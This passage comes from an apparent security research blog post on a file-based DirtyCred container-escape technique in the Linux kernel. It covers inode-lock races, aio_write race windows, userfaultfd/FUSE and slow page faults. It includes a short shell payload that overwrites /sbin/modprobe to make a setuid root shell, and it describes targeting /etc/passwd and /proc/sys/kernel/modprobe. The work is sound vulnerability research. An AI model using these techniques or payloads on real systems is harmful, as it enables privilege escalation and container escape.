</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">inode</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">*</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">inode</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">=</span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">file_inode</span></span></span><span class="p"><span class="hljs-class">(</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">iocb</span></span></span><span class="o"><span class="hljs-class">-&gt;</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">ki_filp</span></span></span><span class="p"><span class="hljs-class">);</span></span> <span class="c1"><span class="hljs-comment">// Local variable!</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_flags</span> <span class="o">&amp;</span> <span class="n">IOCB_NOWAIT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">EOPNOTSUPP</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">inode_lock</span><span class="p">(</span><span class="n">inode</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// &lt;=== [A]</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">ret</span> <span class="o">=</span> <span class="n">ext4_write_checks</span><span class="p">(</span><span class="n">iocb</span><span class="p">,</span> <span class="n">from</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">goto</span></span> <span class="n">out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">current</span><span class="o">-&gt;</span><span class="n">backing_dev_info</span> <span class="o">=</span> <span class="n">inode_to_bdi</span><span class="p">(</span><span class="n">inode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="n">generic_perform_write</span><span class="p">(</span><span class="n">iocb</span><span class="p">,</span> <span class="n">from</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// Actual write occurs in here</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">current</span><span class="o">-&gt;</span><span class="n">backing_dev_info</span> <span class="o">=</span> <span class="nb"><span class="hljs-literal">NULL</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">inode_unlock</span><span class="p">(</span><span class="n">inode</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// &lt;=== [B]</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">likely</span><span class="p">(</span><span class="n">ret</span> <span class="o">&gt;</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">+=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="n">generic_write_sync</span><span class="p">(</span><span class="n">iocb</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">generic_perform_write</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">kiocb</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">iocb</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">iov_iter</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">i</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">file</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">*</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">file</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">=</span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">iocb</span></span></span><span class="o"><span class="hljs-class">-&gt;</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">ki_filp</span></span></span><span class="p"><span class="hljs-class">;</span></span>
</span></span><span class="line"><span class="cl">	<span class="c1"><span class="hljs-comment">// ...</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>To avoid problems arising from multiple tasks writing concurrently to the same file, the write operation is enclosed within a mutex. In other words, only one process can write to the file at any given time. This allows us to stabilise the exploit with the idea shown in the diagram below (taken from the DirtyCred slides):</p>
<p><img loading="lazy" src="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/07-container-escape-using-file-based-DirtyCred_002.png" alt="">
</p>
<p>When thread A performs a slow write to file A, it grabs the corresponding inode’s lock. This prevents thread B from entering the critical region between [A] and [B]. We could make use of this waiting period to swap out file A’s <code>file</code> struct with that of file B’s. When thread A releases the inode lock, thread B grabs it and proceeds to perform the write on the wrong file.</p>
<h3 id="local-privilege-escalation">Local privilege escalation<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#local-privilege-escalation">#</a></h3>
<p>It is not difficult to see how such a primitive would allow us to achieve local privilege escalation. One possibility would be to <a href="https://blog.hacktivesecurity.com/index.php/2022/12/21/cve-2022-2602-dirtycred-file-exploitation-applied-on-an-io_uring-uaf/">to add a new user with root privileges by targeting <code>/etc/passwd</code></a>. But I took a different approach, targeting <a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique"><code>/sbin/modprobe</code></a> instead.</p>
<p>When we attempt to execute a file with unknown magic header, the kernel will invoke the binary pointed to by the global kernel variable <code>modprobe_path</code> <strong>with root privileges and from the root namespace</strong>. By default, this is <code>/sbin/modprobe</code>.</p>
<p>Hence, I overwrote <code>/sbin/modprobe</code> with the following shell script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh hljs bash" data-lang="sh"><span class="line"><span class="cl"><span class="cp"><span class="hljs-meta">#!/bin/sh</span>
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>cp /bin/sh /tmp/sh
</span></span><span class="line"><span class="cl">chmod <span class="m">4777</span> /tmp/sh
</span></span></code></pre></div><p>When I tried to execute a file with an invalid magic header, the kernel executed the above script, creating a setuid copy of <code>/bin/sh</code>. We now have a root shell.</p>
<h2 id="the-rabbit-hole">The rabbit hole<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#the-rabbit-hole">#</a></h2>
<p>When I showed my exploit to Billy, he pointed out that my approach wouldn’t work in a containerised environment, as <code>/sbin/modprobe</code> wouldn’t be reachable from the container’s namespace. Instead, he asked if we could target the <code>modprobe_path</code> variable directly, through <code>/proc/sys/kernel/modprobe</code>.</p>
<h3 id="the-proc-filesystem-and-you">The <code>/proc</code> filesystem and you<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#the-proc-filesystem-and-you">#</a></h3>
<p><code>/proc</code> is a pseudo-filesystem that <a href="https://docs.kernel.org/filesystems/proc.html">“acts as an interface to internal data structures in the kernel”</a>. In particular, the <code>/proc/sys</code> subdirectory allows us to change the value of various kernel parameters, simply by writing to them as if they were a file.</p>
<p>As a relevant example, <code>/proc/sys/kernel/modprobe</code> is aliased directly to the <code>modprobe_path</code> kernel global variable, and writing to this “file” will correspondingly change the value of <code>modprobe_path</code>.</p>
<blockquote>
<p>Important: we cannot write to anything in <code>/proc/sys/*</code> <a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/proc/proc_sysctl.c#L582">if we aren’t root</a>. But this is not a big problem, because we can just leverage traditional DirtyCred to get local privilege escalation by targeting <code>/etc/passwd</code> beforehand.</p>
</blockquote>
<p>It should be clear that these file operations require special handler functions. <code>file</code> structs associated with <code>/proc/sys/*</code> “files” have <code>f_op</code> set to <code>proc_sys_file_operations</code>.</p>
<p>This creates a problem, because the inode locking technique from earlier relies on the assumption that <code>ext4_buffered_write_iter()</code> can still successfully write to the target file. Actually attempting to do this with a <code>/proc/sys/*</code> file will cause undefined behaviour, which usually results in an error code being returned.</p>
<p>Instead, we will have to swap out the <code>file</code> structs before the call to the write handler is resolved, meaning that we have the following race window:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c hljs" data-lang="c"><span class="line"><span class="cl"><span class="n"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">vfs_write</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">file</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">file</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">__user</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">buf</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">size_t</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">count</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">loff_t</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">pos</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n"><span class="hljs-keyword">ssize_t</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">&amp;</span> <span class="n">FMODE_WRITE</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">&amp;</span> <span class="n">FMODE_CAN_WRITE</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="c1"><span class="hljs-comment">// RACE WINDOW START</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">access_ok</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">count</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="n">rw_verify_area</span><span class="p">(</span><span class="n">WRITE</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">MAX_RW_COUNT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">count</span> <span class="o">=</span>  <span class="n">MAX_RW_COUNT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">file_start_write</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="c1"><span class="hljs-comment">// RACE WINDOW END</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">else</span></span> <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">write_iter</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="n">new_sync_write</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">else</span></span>
</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">fsnotify_modify</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">add_wchar</span><span class="p">(</span><span class="n">current</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="n">inc_syscw</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">file_end_write</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>That’s pretty small. Can we improve our chances?</p>
<h3 id="a-new-target-aio_write">A new target: <code>aio_write()</code><a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#a-new-target-aio_write">#</a></h3>
<p>The <a href="https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/">kernel AIO subsystem</a> (not to be confused with POSIX AIO) is a somewhat obsolete asynchronous I/O interface which could be considered as a predecessor to io_uring. Billy pointed me towards the <a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/aio.c#L1568"><code>aio_write()</code></a> function, which will be invoked if we request a write syscall through the kernel AIO interface:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c hljs" data-lang="c"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">aio_write</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">kiocb</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">req</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">iocb</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">iocb</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params">
</span></span></span></span><span class="line"><span class="cl"><span class="hljs-function"><span class="hljs-params">			 </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">bool</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">vectored</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">bool</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">compat</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">iovec</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">inline_vecs</span></span></span><span class="p"><span class="hljs-class">[</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">UIO_FASTIOV</span></span></span><span class="p"><span class="hljs-class">],</span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">*</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">iovec</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">=</span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">inline_vecs</span></span></span><span class="p"><span class="hljs-class">;</span></span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">iov_iter</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">iter</span></span></span><span class="p"><span class="hljs-class">;</span></span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">file</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">*</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">file</span></span></span><span class="p"><span class="hljs-class">;</span></span>
</span></span><span class="line"><span class="cl">	<span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="n">aio_prep_rw</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">iocb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">file</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">ki_filp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">&amp;</span> <span class="n">FMODE_WRITE</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">write_iter</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="n">aio_setup_rw</span><span class="p">(</span><span class="n">WRITE</span><span class="p">,</span> <span class="n">iocb</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iovec</span><span class="p">,</span> <span class="n">vectored</span><span class="p">,</span> <span class="n">compat</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="n">rw_verify_area</span><span class="p">(</span><span class="n">WRITE</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">ki_pos</span><span class="p">,</span> <span class="n">iov_iter_count</span><span class="p">(</span><span class="o">&amp;</span><span class="n">iter</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="cm"><span class="hljs-comment">/*
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment">		 * Open-code file_start_write here to grab freeze protection,
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment">		 * which will be released by another thread in
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment">		 * aio_complete_rw().  Fool lockdep by telling it the lock got
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment">		 * released so that it doesn't complain about the held lock when
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment">		 * we return to userspace.
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment">		 */</span></span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">S_ISREG</span><span class="p">(</span><span class="n">file_inode</span><span class="p">(</span><span class="n">file</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">i_mode</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">sb_start_write</span><span class="p">(</span><span class="n">file_inode</span><span class="p">(</span><span class="n">file</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">i_sb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="n">__sb_writers_release</span><span class="p">(</span><span class="n">file_inode</span><span class="p">(</span><span class="n">file</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">i_sb</span><span class="p">,</span> <span class="n">SB_FREEZE_WRITE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="n">req</span><span class="o">-&gt;</span><span class="n">ki_flags</span> <span class="o">|=</span> <span class="n">IOCB_WRITE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">aio_rw_done</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">call_write_iter</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iter</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="n">kfree</span><span class="p">(</span><span class="n">iovec</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>aio_setup_rw()</code> copies <code>iovec</code>s from userland using <code>copy_from_user()</code>. Furthermore, it lies within our race window (after the permissions check, but before the write handler gets resolved). As such, if we have access to <a href="https://blog.lizzie.io/using-userfaultfd.html">userfaultfd</a> or <a href="https://exploiter.dev/blog/2022/FUSE-exploit.html">FUSE</a>, we can consistently win the race, allowing us to redirect the write operation to <code>/proc/sys/kernel/modprobe</code>.</p>
<p>But wait. Why would anyone need to enable FUSE or kernel page fault handling for userfaultfd <em>within</em> a container? The sad truth is that the conditions necessary to utilise the aforementioned technique are far too stringent to be useful in an average real-world exploitation scenario.</p>
<blockquote>
<p>Note: technically, even if userfaultfd kernel page fault handling is disabled, we could still use it if we have the <code>CAP_SYS_PTRACE</code> capability (the actual check is <a href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/userfaultfd.c#L2064">here</a>). However, in general, we are unlikely to have this even as container root.</p>
</blockquote>
<p>Unless…</p>
<h3 id="slow-page-fault-to-the-rescue">Slow page fault to the rescue<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#slow-page-fault-to-the-rescue">#</a></h3>
<p>Let’s think about the role being played by userfaultfd and FUSE in our exploit technique so far. When the kernel encounters a page fault while trying to copy data from userland:</p>
<ul>
<li>userfaultfd causes the faulting kernel thread to pause until we handle the page fault from userland.</li>
<li>Our custom FUSE read handler is invoked when the kernel tries to load the faulting page into memory.</li>
</ul>
<p>In both of these cases, we can simply stall the kernel thread at this <code>copy_from_user()</code> call until we’re done with other stuff, like spraying the heap. But is it possible to make the page fault take so long that we could complete our heap spray during that time window?</p>
